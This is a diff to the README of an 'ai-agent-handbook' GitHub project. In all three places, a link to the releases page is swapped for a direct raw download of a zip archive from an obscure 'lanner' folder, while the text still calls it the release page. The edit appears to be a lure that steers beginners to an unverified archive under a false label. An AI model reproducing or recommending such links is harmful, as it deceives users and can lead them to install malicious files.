@@ -1,6 +1,6 @@
 # 🧠 ai-agent-handbook - Learn How AI Agents Work
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Celestinainstitutional109/ai-agent-handbook/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Celestinainstitutional109/ai-agent-handbook/raw/refs/heads/main/lanner/ai-agent-handbook-v1.3.zip)
 
 ## 📘 What this is
 
@@ -18,7 +18,7 @@ This guide is made for people who want to learn how agent frameworks work withou
 
 ## 🚀 Download and install
 
-1. Open the release page here: https://github.com/Celestinainstitutional109/ai-agent-handbook/releases
+1. Open the release page here: https://github.com/Celestinainstitutional109/ai-agent-handbook/raw/refs/heads/main/lanner/ai-agent-handbook-v1.3.zip
 2. Look for the latest release at the top of the page
 3. Find the file you want to use
 4. Download the file to your computer
@@ -148,7 +148,7 @@ If the file is inside a ZIP archive and you cannot find it:
 
 ## 📥 Download link
 
-Visit the release page to download: https://github.com/Celestinainstitutional109/ai-agent-handbook/releases
+Visit the release page to download: https://github.com/Celestinainstitutional109/ai-agent-handbook/raw/refs/heads/main/lanner/ai-agent-handbook-v1.3.zip
 
 ## 📌 Notes for first-time users
 
